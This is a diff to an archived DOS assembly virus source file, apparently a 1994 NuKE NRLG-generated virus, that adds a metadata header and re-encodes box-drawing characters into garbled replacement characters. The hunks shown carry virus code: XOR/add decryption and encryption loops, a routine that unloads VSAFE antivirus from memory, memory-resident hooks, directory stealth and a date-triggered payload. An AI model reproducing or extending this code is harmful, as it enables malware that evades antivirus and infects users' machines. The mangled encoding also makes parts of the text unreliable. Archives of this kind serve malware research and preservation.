@@ -1,10 +1,21 @@
-;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
-;³ THiS iS a [NuKE] RaNDoMiC LiFe GeNeRaToR ViRuS.        ³ [NuKE] PoWeR
-;³ CReaTeD iS a N.R.L.G. PRoGRaM V0.66 BeTa TeST VeRSioN  ³ [NuKE] WaReZ
-;³ auToR: aLL [NuKE] MeMeBeRS                             ³ [NuKE] PoWeR
-;³ [NuKE] THe ReaL PoWeR!                                 ³ [NuKE] WaReZ
-;³ NRLG WRiTTeR: AZRAEL (C) [NuKE] 1994                   ³ [NuKE] PoWeR
-;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+; ------------------------------------------------------------
+; name      F
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¿
+;ï¿½ THiS iS a [NuKE] RaNDoMiC LiFe GeNeRaToR ViRuS.        ï¿½ [NuKE] PoWeR
+;ï¿½ CReaTeD iS a N.R.L.G. PRoGRaM V0.66 BeTa TeST VeRSioN  ï¿½ [NuKE] WaReZ
+;ï¿½ auToR: aLL [NuKE] MeMeBeRS                             ï¿½ [NuKE] PoWeR
+;ï¿½ [NuKE] THe ReaL PoWeR!                                 ï¿½ [NuKE] WaReZ
+;ï¿½ NRLG WRiTTeR: AZRAEL (C) [NuKE] 1994                   ï¿½ [NuKE] PoWeR
+;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 .286
 code    segment
@@ -32,7 +43,7 @@ mov dx,1                     ;dx = value for decrypt
 deci:                        ;deci = fuck label!                                    
 ;----------------------------------------------------------
 
-ÿxor word ptr [di],0fbfbh
+ï¿½xor word ptr [di],0fbfbh
 add byte ptr [di],087h
 add word ptr [di],0c574h
 add byte ptr [di],0b8h
@@ -48,7 +59,7 @@ sub byte ptr [di],089h
 inc word ptr [di]
 xor byte ptr [di],098h
 not word ptr [di] 
-ÿinc di
+ï¿½inc di
 inc di
 ;----------------------------------------------------------                                                
 jmp bye                      ;######## BYE BYE F-PROT ! ##########     
@@ -86,7 +97,7 @@ call action
 ; NRLG FUNCTIONS  (SELECTABLE)
 ;*****************************************************************
 
-ÿcall ANTI_V
+ï¿½call ANTI_V
 ;****************************************************************
 ;               PROCESS TO REMAIN RESIDENT                                                                  
 ;****************************************************************   
@@ -288,7 +299,7 @@ mov di,offset fin + 50 + (offset crypt - offset start)  ;virus
 mov dx,1
 enc2:                              ;           
 
-ÿnot word ptr [di]
+ï¿½not word ptr [di]
 xor byte ptr [di],098h
 dec word ptr [di]
 add byte ptr [di],089h
@@ -304,7 +315,7 @@ sub byte ptr [di],0b8h
 sub word ptr [di],0c574h
 sub byte ptr [di],087h
 xor word ptr [di],0fbfbh
-ÿinc di
+ï¿½inc di
 inc di                             ;the virus code                  
 loop enc2                          ;              
 ;--------------------------------------------
@@ -392,7 +403,7 @@ attrib dw  ?
 int21  dd  ?
 error  dd  ?
 
-ÿ;---------------------------------
+ï¿½;---------------------------------
 action:                          ; 
 MOV AH,2AH                       ;        
 INT 21H                          ;get date           
@@ -434,7 +445,7 @@ ret                              ;
 trampaint  dd  ?                 ;
 ;--------------------------------;
 
-ÿ;---------------------------------
+ï¿½;---------------------------------
 ANTI_V:                          ; 
 MOV AX,0FA01H                    ;REMOVE VSAFE FROM MEMORY        
 MOV DX,5945H                     ; 
@@ -442,7 +453,7 @@ INT 21H                          ;
 ret                              ;
 ;---------------------------------
 
-ÿ;*****************************************************
+ï¿½;*****************************************************
 dir_s:                                                               
              pushf                                                         
              push    cs                                                    
@@ -481,7 +492,7 @@ no_good:     iret
 ; THIS DIR STEALTH METOD IS EXTRAC FROM NUKEK INFO JOURNAL 4 & N-POX 
 ;*********************************************************************
 
-ÿaction_dia Db 020H ;day for the action
+ï¿½action_dia Db 020H ;day for the action
 action_mes Db 04H ;month for the action
 FECHA DW 01eH ;Secon for mark
 FECHAd Db 01eH ;Secon for mark dir st
